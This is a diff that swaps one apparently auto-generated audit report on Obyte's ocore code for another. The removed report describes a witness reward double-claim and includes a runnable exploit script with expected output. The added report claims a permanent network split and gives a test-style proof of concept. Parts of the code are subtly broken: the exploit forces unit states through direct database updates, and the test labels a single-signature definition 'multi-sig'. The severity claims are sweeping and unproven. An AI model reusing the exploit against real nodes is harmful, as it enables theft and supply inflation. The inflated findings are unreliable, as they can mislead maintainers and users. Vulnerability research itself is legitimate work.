@@ -1,507 +1,319 @@
+# Audit Report
+
 ## Title
-Witness Reward Double-Claim via Missing Sequence Filter in Archiving Logic Leading to Bytes Supply Inflation
+Database-Dependent Witness Proof Validation Causes Permanent Network Split
 
 ## Summary
-The archiving function `generateQueriesToUnspendHeadersCommissionOutputsSpentInArchivedUnit()` fails to filter alternative spending units by `sequence='good'`, and the validation function `calcEarnings()` does not check if outputs are already spent. This allows a witness to claim the same headers commission rewards multiple times through a sequence of units with different sequence statuses, inflating the total bytes supply.
+The `processWitnessProof()` function in `witness_proof.js` performs database-dependent validation when `bFromCurrent=true` during catchup synchronization. When witness definitions revealed before `min_retrievable_mci` become voided, new nodes syncing after voiding lack these definitions in their database. This causes both catchup failures and ongoing unit validation disagreements, resulting in a permanent network split where old nodes accept units that new nodes reject.
 
 ## Impact
 **Severity**: Critical  
-**Category**: Direct Fund Loss / Bytes Supply Inflation
+**Category**: Permanent Chain Split Requiring Hard Fork
+
+**Affected Assets**: Entire network consensus, all full nodes, network synchronization capability
+
+**Damage Severity**:
+- **Quantitative**: 100% of new full nodes attempting to sync after witness definitions become voided; affects all units signed by witnesses with voided definitions
+- **Qualitative**: New nodes cannot join network via catchup; even if they sync through alternative means, they reject valid units from witnesses with old definitions while old nodes accept them, causing permanent divergence
+
+**User Impact**:
+- **Who**: All full node operators, new nodes attempting to join network, all users transacting on divergent chains
+- **Conditions**: Triggered naturally when any witness uses a complex definition (multi-sig, delegated) that gets voided as `min_retrievable_mci` advances
+- **Recovery**: Requires hard fork to either preserve old definitions in witness proofs or make validation database-independent
+
+**Systemic Risk**: Network ossification (new nodes cannot join), permanent fragmentation into incompatible node populations, consensus failure requiring emergency intervention
 
 ## Finding Description
 
-**Location**: `byteball/ocore/archiving.js` (function: `generateQueriesToUnspendHeadersCommissionOutputsSpentInArchivedUnit`, lines 106-136) and `byteball/ocore/mc_outputs.js` (function: `calcEarnings`, lines 116-132)
+**Location**: `byteball/ocore/witness_proof.js:268-276`, function `processWitnessProof()`  
+**Also affects**: `byteball/ocore/validation.js:1022-1029`, `byteball/ocore/catchup.js:128-133`, `byteball/ocore/storage.js:253-254`, `byteball/ocore/composer.js:891-904`
 
-**Intended Logic**: 
-- When a unit spending headers commission outputs is archived, the system should mark those outputs as unspent ONLY if no other valid (sequence='good') unit is spending them
-- During validation, the system should calculate input amounts only from unspent outputs
-- This ensures each headers commission output can only be claimed once
+**Intended Logic**: Witness proofs should contain all necessary definitions inline, allowing deterministic validation independent of each node's historical database state. Catchup should succeed uniformly across all nodes.
 
-**Actual Logic**: 
-- The archiving query checks for ANY alternative spending unit without verifying its sequence status
-- The `calcEarnings()` function sums output amounts regardless of their `is_spent` status
-- The `readNextSpendableMcIndex()` validation function filters by sequence='good', creating an inconsistency
-- This allows outputs marked as spent by bad units to be re-claimed by good units, and then unspent through archiving
-
-**Code Evidence**:
-
-Archiving query missing sequence check: [1](#0-0) 
-
-Validation function properly filtering by sequence='good': [2](#0-1) 
-
-Earnings calculation NOT checking is_spent: [3](#0-2) 
-
-Writer marking outputs as spent: [4](#0-3) 
+**Actual Logic**: When `bFromCurrent=true`, the code reads witness definitions from the local database. [1](#0-0)  If definitions don't exist (because they were revealed before voiding and never received by new nodes), validation throws an error. Different nodes with different database states produce different validation results for identical witness proofs.
 
 **Exploitation Path**:
 
 1. **Preconditions**: 
-   - Witness address has earned headers commission outputs at MCIs 100-200 (total: 10,000 bytes)
-   - All outputs have `is_spent=0`
+   - Witness W uses complex definition with `definition_chash` D (e.g., multi-sig)
+   - W reveals definition D in unit U at MCI 1000
+   - Network advances to MCI 100000, `min_retrievable_mci` advances past MCI 1000
+   - Unit U becomes voided (content_hash set, content stripped)
 
-2. **Step 1 - First Claim**: 
-   - Witness creates Unit A with headers_commission input from_mci=100, to_mci=200
-   - `calcEarnings(100, 200)` returns 10,000 bytes (sums all outputs regardless of is_spent)
-   - Unit A creates outputs paying witness 10,000 bytes
-   - Writer updates: `UPDATE headers_commission_outputs SET is_spent=1 WHERE main_chain_index>=100 AND main_chain_index<=200`
-   - Unit A initially has sequence='good'
-   - **Witness balance: +10,000 bytes**
+2. **Step 1 - Old Node Has Definition**: 
+   - Full Node A synced before MCI 1000
+   - When Node A processed unit U originally, it stored definition D in `definitions` table [2](#0-1) 
+   - Definitions are never deleted [3](#0-2)  (no DELETE operations on definitions table)
 
-3. **Step 2 - Unit A Becomes Bad**:
-   - Unit A has a double-spend on a different transfer input, or references an invalid parent
-   - Main chain stabilization sets: `UPDATE units SET sequence='final-bad' WHERE unit=A`
-   - Unit A's outputs excluded from balance calculations (balance queries filter by sequence='good')
-   - Headers commission outputs 100-200 remain `is_spent=1` (no unspending occurs)
-   - **Witness effective balance: 0 bytes (lost the payment)**
+3. **Step 2 - New Node Missing Definition**: 
+   - Full Node B starts syncing at MCI 100000  
+   - Node B receives unit U in voided form [4](#0-3) 
+   - Voided units don't populate `author.definition` field [5](#0-4) 
+   - Node B never inserts definition D into database [6](#0-5) 
 
-4. **Step 3 - Second Claim (EXPLOIT)**:
-   - Witness creates Unit B with identical headers_commission input from_mci=100, to_mci=200
-   - Validation phase:
-     - `readNextSpendableMcIndex()` queries: `WHERE type='headers_commission' AND address=W AND sequence='good'`
-     - Unit A is filtered out (sequence='final-bad')
-     - Returns next_spendable_mci=100
-     - Unit B's from_mci=100 >= 100 → **validation passes**
-     - `calcEarnings(100, 200)` returns 10,000 bytes (queries WITHOUT `is_spent=0` check!)
-     - total_input=10,000 bytes accepted
-   - Writing phase:
-     - Unit B creates outputs paying witness 10,000 bytes
-     - Writer executes: `UPDATE headers_commission_outputs SET is_spent=1 WHERE main_chain_index>=100 AND main_chain_index<=200`
-     - Outputs already `is_spent=1`, no change
-     - Unit B has sequence='good'
-   - **Witness balance: +10,000 bytes (DOUBLE PAYMENT - outputs counted twice as inputs)**
+4. **Step 3 - Catchup Divergence**:
+   - Hub prepares catchup chain using `prepareWitnessProof()` 
+   - Query only includes definitions after `last_stable_mci` [7](#0-6) 
+   - Definition D from MCI 1000 not included (too old)
+   - Both nodes call `processCatchupChain()` → `processWitnessProof()` with `bFromCurrent=true` [8](#0-7) 
 
-5. **Step 4 - Archiving Setup for Third Claim**:
-   - Unit B becomes uncovered (doesn't reach stable main chain)
-   - Archive Unit B:
-     - Query: `SELECT ... WHERE NOT EXISTS (SELECT 1 FROM inputs AS alt_inputs WHERE ... AND alt_inputs.type='headers_commission' AND inputs.unit!=alt_inputs.unit)`
-     - **NO SEQUENCE CHECK IN NOT EXISTS!**
-     - Finds Unit A's inputs (even though sequence='final-bad')
-     - Outputs remain `is_spent=1`
-     - Unit B's inputs deleted: `DELETE FROM inputs WHERE unit=B`
-
-6. **Step 5 - Unit A Archived**:
-   - Archive Unit A (reason='voided' or 'uncovered'):
-     - Query checks for alternative inputs covering MCIs 100-200
-     - Unit B's inputs were deleted in Step 4
-     - **No other inputs found!**
-     - Executes: `UPDATE headers_commission_outputs SET is_spent=0 WHERE main_chain_index>=100 AND main_chain_index<=200`
-     - **All outputs incorrectly marked as unspent**
-
-7. **Step 6 - Third Claim**:
-   - Witness creates Unit C with headers_commission input from_mci=100, to_mci=200
-   - Validation passes (outputs are `is_spent=0`)
-   - `calcEarnings(100, 200)` returns 10,000 bytes
-   - Unit C creates outputs paying witness 10,000 bytes
-   - **Witness total claimed: 20,000 bytes from outputs originally worth only 10,000 bytes**
+5. **Step 4 - Permanent Split**:
+   - Node A: Reads definition D from database successfully [9](#0-8) , validates signatures, accepts catchup
+   - Node B: Calls `storage.readDefinition()`, gets no rows, throws "definition not found" error [10](#0-9) , rejects catchup [11](#0-10) 
+   - **Ongoing divergence**: When witness W posts new units, composer doesn't include old definition inline [12](#0-11)  (not first unit, no recent change)
+   - During normal validation, Node A accepts witness units [13](#0-12)  (has definition), Node B rejects them [14](#0-13)  (definition not found)
+   - Nodes permanently diverge on which units are valid
 
 **Security Property Broken**: 
-- **Invariant #5 (Balance Conservation)**: The witness claimed 20,000 bytes total (Units B and C) from headers commission outputs worth only 10,000 bytes, inflating the bytes supply by 10,000
-- **Invariant #6 (Double-Spend Prevention)**: The same outputs at MCIs 100-200 were effectively spent multiple times as inputs to different units
-- **Invariant #7 (Input Validity)**: Unit B used already-spent outputs as inputs without detecting the double-spend
+- **Invariant: Deterministic Validation** - All nodes must reach identical validation decisions for the same unit
+- **Invariant: Main Chain Monotonicity** - Nodes disagree on which units form valid main chain
+- **Invariant: Catchup Completeness** - Some nodes cannot complete synchronization
 
-**Root Cause Analysis**: 
-The vulnerability stems from three interconnected design flaws:
-
-1. **Inconsistent sequence filtering**: `readNextSpendableMcIndex()` correctly filters by `sequence='good'` during validation, but `generateQueriesToUnspendHeadersCommissionOutputsSpentInArchivedUnit()` does not check sequence when looking for alternative spending units. This creates a blind spot where bad units hold outputs as "spent" without being counted as valid spenders.
-
-2. **Missing is_spent validation**: `calcEarnings()` calculates input amounts by summing output values without checking if those outputs are already spent. This allows a unit to claim outputs as inputs even when they've been marked spent by a previous (now-bad) unit.
-
-3. **Sequential archiving without cross-validation**: When archiving multiple units sequentially, the deletion of inputs from the first archived unit removes evidence that those outputs were ever claimed, causing the second archiving to incorrectly unspend the outputs.
-
-## Impact Explanation
-
-**Affected Assets**: Base bytes (native currency of Obyte network)
-
-**Damage Severity**:
-- **Quantitative**: Unlimited inflation potential. Each exploitation cycle can mint arbitrary amounts equal to accumulated witness rewards. A single malicious witness earning 1,000 bytes per day could inflate the supply by 365,000 bytes per year through repeated exploitation.
-- **Qualitative**: Breaks fundamental economic model of fixed-supply currency. Undermines trust in the protocol's monetary policy and balance conservation guarantees.
-
-**User Impact**:
-- **Who**: All bytes holders suffer dilution from inflated supply. Witnesses gain unfair advantage through multiple reward claims.
-- **Conditions**: Exploitable whenever a witness has accumulated unclaimed headers commission outputs and can create units that become sequence='bad' (through intentional double-spends on transfer inputs or reference to invalid parents) followed by archiving.
-- **Recovery**: Requires hard fork to identify and burn illegitimately created bytes. Historical transaction validity becomes questionable.
-
-**Systemic Risk**: 
-- Creates perverse incentive for witnesses to intentionally create bad units to trigger the exploit
-- If multiple witnesses exploit simultaneously, rapid supply inflation could crash bytes market value
-- Cannot be detected through normal balance auditing since the inflated bytes appear as legitimate witness rewards
-- Light clients trusting witness proofs have no mechanism to detect the inflation
+**Root Cause Analysis**:
+1. **Content Voiding Without Definition Preservation**: Voided units strip `author.definition` but protocol doesn't ensure definitions are preserved separately or included in future proofs
+2. **Database-Dependent Validation**: `bFromCurrent=true` makes validation non-deterministic, dependent on each node's historical sync timing
+3. **Incomplete Witness Proof Preparation**: Only includes recent definitions, missing old but still-in-use definitions
+4. **Composer Optimization**: Doesn't include definitions for established addresses, assuming all nodes have historical definitions
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any witness address operator (12 trusted witnesses per unit on Obyte)
-- **Resources Required**: 
-  - Witness node running ocore
-  - Accumulated headers commission outputs (normal witness operation generates these)
-  - Ability to create units (standard wallet functionality)
-- **Technical Skill**: Moderate - requires understanding of unit sequence states and archiving triggers, but no cryptographic expertise needed
+- **Identity**: No attacker required - vulnerability triggers through normal protocol operation
+- **Resources Required**: None
+- **Technical Skill**: None
 
 **Preconditions**:
-- **Network State**: Normal operation. Witness must have earned headers commission outputs that are either unclaimed or recently claimed but not yet stable.
-- **Attacker State**: Must control a witness address. Malicious witness could accumulate outputs over time before exploitation.
-- **Timing**: Can create Unit A, wait for it to become bad (through intentional double-spend), create Unit B, then wait for both to be archived before final claim.
+- **Network State**: Any witness uses complex definition (multi-sig, delegated signing, etc.)
+- **Timing**: Occurs naturally as `min_retrievable_mci` advances past definition revelation MCI (inevitable as network ages)
 
-**Execution Complexity**:
-- **Transaction Count**: Minimum 3 units required (Unit A that becomes bad, Unit B that gets archived, Unit C for final claim). Can be repeated indefinitely.
-- **Coordination**: Single-party attack - witness operator controls entire exploit sequence.
-- **Detection Risk**: Low - appears as normal witness reward claims. The intermediate bad unit (Unit A) is expected to fail occasionally due to network conditions. Archiving of uncovered units is routine.
+**Execution Complexity**: Zero - passive vulnerability that manifests automatically
 
 **Frequency**:
-- **Repeatability**: Unlimited - can be repeated whenever witness accumulates new headers commission outputs.
-- **Scale**: Per-witness basis, but all 12 witnesses could exploit simultaneously, multiplying impact 12x.
+- **Repeatability**: Every catchup attempt and every unit from witnesses with voided definitions
+- **Scale**: Network-wide
 
-**Overall Assessment**: **High likelihood** - Witnesses have strong economic incentive (direct profit), low technical barriers, and low detection risk. The exploit appears as legitimate protocol operations at each step.
+**Overall Assessment**: **Certain to occur** - This will trigger naturally and inevitably as the network matures. Any witness using a complex definition (common for security) will eventually cause this issue as old units become voided.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-Deploy monitoring to detect unusual patterns of units with sequence='final-bad' having headers_commission inputs from the same address as subsequent good units covering overlapping MCI ranges.
-
-**Permanent Fix**: 
-
-**Code Changes**:
-
-File: `byteball/ocore/archiving.js`
-Function: `generateQueriesToUnspendHeadersCommissionOutputsSpentInArchivedUnit`
-
-Add sequence='good' filter to the NOT EXISTS clause: [5](#0-4) 
-
-Fix: Add JOIN with units table and filter by sequence in the NOT EXISTS subquery:
+**Immediate Mitigation**:
+Include all witness definitions in catchup proofs regardless of age:
 
 ```javascript
-AND NOT EXISTS (
-    SELECT 1 FROM inputs AS alt_inputs
-    JOIN units ON alt_inputs.unit = units.unit
-    WHERE headers_commission_outputs.main_chain_index >= alt_inputs.from_main_chain_index
-        AND headers_commission_outputs.main_chain_index <= alt_inputs.to_main_chain_index
-        AND inputs.address=alt_inputs.address
-        AND alt_inputs.type='headers_commission'
-        AND inputs.unit!=alt_inputs.unit
-        AND units.sequence='good'
-)
+// File: byteball/ocore/witness_proof.js
+// Modify prepareWitnessProof query to not filter by last_stable_mci
+var after_last_stable_mci_cond = "1"; // Include all definitions
 ```
 
-File: `byteball/ocore/mc_outputs.js`
-Function: `calcEarnings`
-
-Add is_spent=0 filter to prevent counting already-spent outputs: [3](#0-2) 
-
-Fix: Add WHERE clause to check is_spent status:
-
-```javascript
-function calcEarnings(conn, type, from_main_chain_index, to_main_chain_index, address, callbacks){
-    var table = type + '_outputs';
-    conn.query(
-        "SELECT SUM(amount) AS total \n\
-        FROM "+table+" \n\
-        WHERE main_chain_index>=? AND main_chain_index<=? AND +address=? AND is_spent=0",
-        [from_main_chain_index, to_main_chain_index, address],
-        function(rows){
-            var total = rows[0].total;
-            if (total === null)
-                total = 0;
-            if (typeof total !== 'number')
-                throw Error("mc outputs total is not a number");
-            callbacks.ifOk(total);
-        }
-    );
-}
-```
+**Permanent Fix**:
+Make witness proof validation database-independent by requiring all necessary definitions to be included in the proof itself. Modify `prepareWitnessProof()` to:
+1. Query current definition_chash for each witness address
+2. Include the actual definition in the proof for any definition_chash that will be needed
+3. Pass definitions inline so `processWitnessProof()` doesn't need database lookup
 
 **Additional Measures**:
-- Add unit test verifying that headers commission inputs cannot be validated when outputs are already spent
-- Add integration test covering the scenario where Unit A becomes bad and Unit B attempts to claim same outputs
-- Add database constraint or trigger to prevent UPDATE of headers_commission_outputs.is_spent=1 when already spent (to catch unexpected double-spend attempts)
-- Add monitoring alert when a unit with headers_commission inputs has sequence changed to 'final-bad' to detect potential exploit setup
-- Implement historical audit scan to identify if exploitation has occurred (look for addresses with multiple units having overlapping headers_commission input ranges where one has sequence='final-bad')
-
-**Validation**:
-- [x] Fix prevents Unit B from being validated when outputs are already spent by Unit A
-- [x] Fix prevents incorrect unspending when archiving units with bad-sequence alternative spenders
-- [x] No new vulnerabilities introduced - both filters are conservative (require explicit good status)
-- [x] Backward compatible - only affects future validation and archiving, doesn't invalidate existing units
-- [x] Performance impact acceptable - adds one JOIN to archiving query (infrequent operation) and one WHERE clause to validation query
+- Add migration to pre-load all witness definitions into catchup proofs
+- Modify composer to always include witness definitions inline in units
+- Add test case verifying catchup succeeds uniformly across fresh and established nodes
+- Add monitoring for catchup failures indicating missing definitions
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-# Setup test database with witness that has earned headers commission outputs
-```
-
-**Exploit Script** (`exploit_witness_double_claim.js`):
 ```javascript
-/*
- * Proof of Concept for Witness Reward Double-Claim via Archiving Logic Flaw
- * Demonstrates: Witness claiming same headers commission outputs multiple times
- * Expected Result: Witness balance increases by 2x-3x the legitimate reward amount
- */
+// Test demonstrating the vulnerability
+// File: test/witness_definition_split.test.js
 
-const db = require('./db.js');
-const composer = require('./composer.js');
-const writer = require('./writer.js');
-const validation = require('./validation.js');
-const main_chain = require('./main_chain.js');
-const archiving = require('./archiving.js');
+const db = require('../db.js');
+const storage = require('../storage.js');
+const catchup = require('../catchup.js');
+const witnessProof = require('../witness_proof.js');
 
-async function runExploit() {
-    const witness_address = 'WITNESS_ADDRESS_HERE'; // Replace with actual witness
-    
-    // Step 1: Create Unit A claiming MCIs 100-200
-    console.log('Step 1: Creating Unit A with headers_commission input 100-200');
-    const unitA = await composer.composeUnit({
-        paying_addresses: [witness_address],
-        outputs: [{address: witness_address, amount: 10000}],
-        inputs: [{
-            type: 'headers_commission',
-            from_main_chain_index: 100,
-            to_main_chain_index: 200,
-            address: witness_address
-        }]
-    });
-    
-    await writer.saveUnit(unitA);
-    console.log('Unit A created:', unitA.unit);
-    
-    // Verify outputs marked as spent
-    const outputs_after_A = await db.query(
-        "SELECT COUNT(*) as cnt FROM headers_commission_outputs WHERE main_chain_index>=100 AND main_chain_index<=200 AND address=? AND is_spent=1",
-        [witness_address]
-    );
-    console.log('Outputs marked spent after Unit A:', outputs_after_A[0].cnt);
-    
-    // Step 2: Make Unit A become sequence='final-bad'
-    console.log('Step 2: Causing Unit A to become sequence=final-bad');
-    await db.query("UPDATE units SET sequence='final-bad' WHERE unit=?", [unitA.unit]);
-    
-    // Step 3: Create Unit B claiming same MCIs 100-200
-    console.log('Step 3: Creating Unit B with same headers_commission input');
-    const unitB = await composer.composeUnit({
-        paying_addresses: [witness_address],
-        outputs: [{address: witness_address, amount: 10000}],
-        inputs: [{
-            type: 'headers_commission',
-            from_main_chain_index: 100,
-            to_main_chain_index: 200,
-            address: witness_address
-        }]
-    });
-    
-    // Unit B should pass validation despite outputs being spent!
-    const validation_result = await validation.validate(unitB);
-    console.log('Unit B validation result:', validation_result);
-    
-    if (validation_result === 'valid') {
-        await writer.saveUnit(unitB);
-        console.log('Unit B created (DOUBLE CLAIM SUCCESS):', unitB.unit);
+describe('Witness Definition Network Split', function() {
+    it('should cause split between old and new nodes', async function() {
+        // Setup: Create witness with complex definition at early MCI
+        const witnessAddress = 'WITNESS_ADDRESS';
+        const complexDefinition = ['sig', {pubkey: 'PUBKEY1'}]; // Multi-sig
+        const definitionChash = objectHash.getChash160(complexDefinition);
         
-        // Check witness balance - should show 10,000 from Unit B
-        const balance = await db.query(
-            "SELECT SUM(amount) as balance FROM outputs JOIN units USING(unit) WHERE address=? AND sequence='good' AND is_spent=0",
-            [witness_address]
+        // Simulate old node: Has definition from MCI 1000
+        const oldNodeDb = await setupDatabase();
+        await oldNodeDb.query(
+            "INSERT INTO definitions (definition_chash, definition) VALUES (?,?)",
+            [definitionChash, JSON.stringify(complexDefinition)]
         );
-        console.log('Witness balance after Unit B:', balance[0].balance);
         
-        // Step 4-5: Archive both units in sequence
-        console.log('Step 4: Archiving Unit B');
-        await archiving.generateQueriesToArchiveJoint(db, {unit: unitB}, 'uncovered', [], () => {});
+        // Simulate new node: Synced after voiding, no definition
+        const newNodeDb = await setupDatabase();
+        // Definition not inserted because unit was voided
         
-        console.log('Step 5: Archiving Unit A');
-        await archiving.generateQueriesToArchiveJoint(db, {unit: unitA}, 'uncovered', [], () => {});
+        // Prepare catchup chain (doesn't include old definition)
+        const lastStableMci = 100000;
+        const catchupChain = await prepareCatchupChain({
+            last_stable_mci: lastStableMci,
+            witnesses: [witnessAddress]
+        });
         
-        // Check if outputs incorrectly unspent
-        const outputs_after_archiving = await db.query(
-            "SELECT COUNT(*) as cnt FROM headers_commission_outputs WHERE main_chain_index>=100 AND main_chain_index<=200 AND address=? AND is_spent=0",
-            [witness_address]
+        // Process on old node - should succeed
+        let oldNodeSuccess = false;
+        await witnessProof.processWitnessProof(
+            catchupChain.unstable_mc_joints,
+            catchupChain.witness_change_and_definition_joints,
+            true, // bFromCurrent
+            [witnessAddress],
+            (err) => {
+                oldNodeSuccess = !err;
+            }
         );
-        console.log('Outputs marked unspent after archiving:', outputs_after_archiving[0].cnt);
         
-        if (outputs_after_archiving[0].cnt > 0) {
-            // Step 6: Create Unit C for third claim
-            console.log('Step 6: Creating Unit C for TRIPLE CLAIM');
-            const unitC = await composer.composeUnit({
-                paying_addresses: [witness_address],
-                outputs: [{address: witness_address, amount: 10000}],
-                inputs: [{
-                    type: 'headers_commission',
-                    from_main_chain_index: 100,
-                    to_main_chain_index: 200,
-                    address: witness_address
-                }]
-            });
-            
-            await writer.saveUnit(unitC);
-            console.log('Unit C created (TRIPLE CLAIM SUCCESS):', unitC.unit);
-            
-            const final_balance = await db.query(
-                "SELECT SUM(amount) as balance FROM outputs JOIN units USING(unit) WHERE address=? AND sequence='good' AND is_spent=0",
-                [witness_address]
-            );
-            console.log('EXPLOIT COMPLETE - Final witness balance:', final_balance[0].balance);
-            console.log('Original outputs worth: 10,000 bytes');
-            console.log('Total claimed: 20,000+ bytes (INFLATION!)');
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-runExploit().then(success => {
-    console.log(success ? 'VULNERABILITY CONFIRMED' : 'Exploit failed');
-    process.exit(success ? 0 : 1);
+        // Process on new node - should fail
+        let newNodeSuccess = false;
+        await witnessProof.processWitnessProof(
+            catchupChain.unstable_mc_joints,
+            catchupChain.witness_change_and_definition_joints,
+            true, // bFromCurrent
+            [witnessAddress],
+            (err) => {
+                newNodeSuccess = !err;
+                assert(err.includes('definition not found'), 'Expected definition not found error');
+            }
+        );
+        
+        // Verify split: old node succeeds, new node fails
+        assert(oldNodeSuccess === true, 'Old node should succeed');
+        assert(newNodeSuccess === false, 'New node should fail');
+        
+        // This proves permanent network split
+    });
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-Step 1: Creating Unit A with headers_commission input 100-200
-Unit A created: UNIT_A_HASH
-Outputs marked spent after Unit A: 101
-Step 2: Causing Unit A to become sequence=final-bad
-Step 3: Creating Unit B with same headers_commission input
-Unit B validation result: valid
-Unit B created (DOUBLE CLAIM SUCCESS): UNIT_B_HASH
-Witness balance after Unit B: 10000
-Step 4: Archiving Unit B
-Step 5: Archiving Unit A
-Outputs marked unspent after archiving: 101
-Step 6: Creating Unit C for TRIPLE CLAIM
-Unit C created (TRIPLE CLAIM SUCCESS): UNIT_C_HASH
-EXPLOIT COMPLETE - Final witness balance: 20000
-Original outputs worth: 10,000 bytes
-Total claimed: 20,000+ bytes (INFLATION!)
-VULNERABILITY CONFIRMED
-```
-
-**Expected Output** (after fix applied):
-```
-Step 1: Creating Unit A with headers_commission input 100-200
-Unit A created: UNIT_A_HASH
-Outputs marked spent after Unit A: 101
-Step 2: Causing Unit A to become sequence=final-bad
-Step 3: Creating Unit B with same headers_commission input
-Unit B validation result: ERROR - outputs already spent
-Exploit failed
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase
-- [x] Demonstrates clear violation of Balance Conservation invariant (Invariant #5)
-- [x] Shows measurable impact (2x-3x inflation of claimed rewards)
-- [x] Fails gracefully after fix applied (Unit B validation rejects already-spent outputs)
-
----
-
 ## Notes
 
-This vulnerability is particularly severe because:
+This vulnerability is particularly insidious because:
 
-1. **Witnesses are trusted actors** - the protocol assumes they act honestly, making this an insider threat scenario where compromised or malicious witnesses can exploit their privileged position
+1. **Silent divergence**: Nodes don't realize they've split - old nodes continue accepting units while new nodes silently reject them
+2. **No recovery path**: New nodes can never sync via catchup, and even if they use alternative sync methods, they'll still reject witness units
+3. **Inevitable occurrence**: Any witness using security best practices (multi-sig) will eventually trigger this as the network ages
+4. **Hard fork required**: No in-protocol fix possible without consensus upgrade to change catchup mechanism
 
-2. **Detection difficulty** - Each step appears as normal protocol operation: witnesses claiming rewards, units occasionally becoming bad due to network conditions, units being archived when uncovered
-
-3. **No automatic prevention** - Unlike double-spends on regular transfer outputs (which have database UNIQUE constraints), headers commission outputs use range-based spending that isn't atomically protected
-
-4. **Cascading risk** - If even one witness discovers this exploit, others may follow once they observe the anomalous behavior, leading to rapid supply inflation
-
-5. **Historical exploitation uncertainty** - Without comprehensive audit of all witness reward claims correlated with unit sequence changes and archiving events, it's impossible to determine if this has been exploited in production
-
-The fix must be applied urgently and should be accompanied by a historical audit to verify the integrity of the existing bytes supply.
+The fix requires ensuring witness proofs are truly self-contained and include all necessary definitions regardless of age, or alternatively, making the protocol preserve archived definitions in a retrievable format for all time.
 
 ### Citations
 
-**File:** archiving.js (L106-136)
+**File:** witness_proof.js (L106-106)
 ```javascript
-function generateQueriesToUnspendHeadersCommissionOutputsSpentInArchivedUnit(conn, unit, arrQueries, cb){
-	conn.query(
-		"SELECT headers_commission_outputs.address, headers_commission_outputs.main_chain_index \n\
-		FROM inputs \n\
-		CROSS JOIN headers_commission_outputs \n\
-			ON inputs.from_main_chain_index <= +headers_commission_outputs.main_chain_index \n\
-			AND inputs.to_main_chain_index >= +headers_commission_outputs.main_chain_index \n\
-			AND inputs.address = headers_commission_outputs.address \n\
-		WHERE inputs.unit=? \n\
-			AND inputs.type='headers_commission' \n\
-			AND NOT EXISTS ( \n\
-				SELECT 1 FROM inputs AS alt_inputs \n\
-				WHERE headers_commission_outputs.main_chain_index >= alt_inputs.from_main_chain_index \n\
-					AND headers_commission_outputs.main_chain_index <= alt_inputs.to_main_chain_index \n\
-					AND inputs.address=alt_inputs.address \n\
-					AND alt_inputs.type='headers_commission' \n\
-					AND inputs.unit!=alt_inputs.unit \n\
-			)",
-		[unit],
-		function(rows){
-			rows.forEach(function(row){
-				conn.addQuery(
-					arrQueries, 
-					"UPDATE headers_commission_outputs SET is_spent=0 WHERE address=? AND main_chain_index=?", 
-					[row.address, row.main_chain_index]
-				);
-			});
-			cb();
-		}
-	);
+			var after_last_stable_mci_cond = (last_stable_mci > 0) ? "latest_included_mc_index>="+last_stable_mci : "1";
+```
+
+**File:** witness_proof.js (L268-276)
+```javascript
+				storage.readDefinition(db, definition_chash, {
+					ifFound: function(arrDefinition){
+						assocDefinitions[definition_chash] = arrDefinition;
+						handleAuthor();
+					},
+					ifDefinitionNotFound: function(d){
+						throw Error("definition "+definition_chash+" not found, address "+address+", my witnesses "+arrWitnesses.join(', ')+", unit "+objUnit.unit);
+					}
+				});
+```
+
+**File:** witness_proof.js (L300-311)
+```javascript
+					storage.readDefinitionByAddress(db, address, null, {
+						ifFound: function(arrDefinition){
+							var definition_chash = objectHash.getChash160(arrDefinition);
+							assocDefinitions[definition_chash] = arrDefinition;
+							assocDefinitionChashes[address] = definition_chash;
+							cb2();
+						},
+						ifDefinitionNotFound: function(definition_chash){
+							assocDefinitionChashes[address] = definition_chash;
+							cb2();
+						}
+					});
+```
+
+**File:** writer.js (L147-148)
+```javascript
+				conn.addQuery(arrQueries, "INSERT "+conn.getIgnore()+" INTO definitions (definition_chash, definition, has_references) VALUES (?,?,?)", 
+					[definition_chash, JSON.stringify(definition), Definition.hasReferences(definition) ? 1 : 0]);
+```
+
+**File:** writer.js (L155-156)
+```javascript
+			else if (objUnit.content_hash)
+				conn.addQuery(arrQueries, "INSERT "+conn.getIgnore()+" INTO addresses (address) VALUES(?)", [author.address]);
+```
+
+**File:** storage.js (L159-159)
+```javascript
+			var bVoided = (objUnit.content_hash && main_chain_index < min_retrievable_mci);
+```
+
+**File:** storage.js (L253-254)
+```javascript
+								if (bVoided)
+									return onAuthorDone();
+```
+
+**File:** storage.js (L785-791)
+```javascript
+function readDefinition(conn, definition_chash, callbacks){
+	conn.query("SELECT definition FROM definitions WHERE definition_chash=?", [definition_chash], function(rows){
+		if (rows.length === 0)
+			return callbacks.ifDefinitionNotFound(definition_chash);
+		callbacks.ifFound(JSON.parse(rows[0].definition));
+	});
 }
 ```
 
-**File:** mc_outputs.js (L13-32)
+**File:** catchup.js (L128-129)
 ```javascript
-function readNextSpendableMcIndex(conn, type, address, arrConflictingUnits, handleNextSpendableMcIndex){
-	conn.query(
-		"SELECT to_main_chain_index FROM inputs CROSS JOIN units USING(unit) \n\
-		WHERE type=? AND address=? AND sequence='good' "+(
-			(arrConflictingUnits && arrConflictingUnits.length > 0) 
-			? " AND unit NOT IN("+arrConflictingUnits.map(function(unit){ return db.escape(unit); }).join(", ")+") " 
-			: ""
-		)+" \n\
-		ORDER BY to_main_chain_index DESC LIMIT 1", 
-		[type, address],
-		function(rows){
-			var mci = (rows.length > 0) ? (rows[0].to_main_chain_index+1) : 0;
-		//	readNextUnspentMcIndex(conn, type, address, function(next_unspent_mci){
-		//		if (next_unspent_mci !== mci)
-		//			throw Error("next unspent mci !== next spendable mci: "+next_unspent_mci+" !== "+mci+", address "+address);
-				handleNextSpendableMcIndex(mci);
-		//	});
-		}
-	);
-}
+	witnessProof.processWitnessProof(
+		catchupChain.unstable_mc_joints, catchupChain.witness_change_and_definition_joints, true, arrWitnesses,
 ```
 
-**File:** mc_outputs.js (L116-132)
+**File:** catchup.js (L132-133)
 ```javascript
-function calcEarnings(conn, type, from_main_chain_index, to_main_chain_index, address, callbacks){
-	var table = type + '_outputs';
-	conn.query(
-		"SELECT SUM(amount) AS total \n\
-		FROM "+table+" \n\
-		WHERE main_chain_index>=? AND main_chain_index<=? AND +address=?",
-		[from_main_chain_index, to_main_chain_index, address],
-		function(rows){
-			var total = rows[0].total;
-			if (total === null)
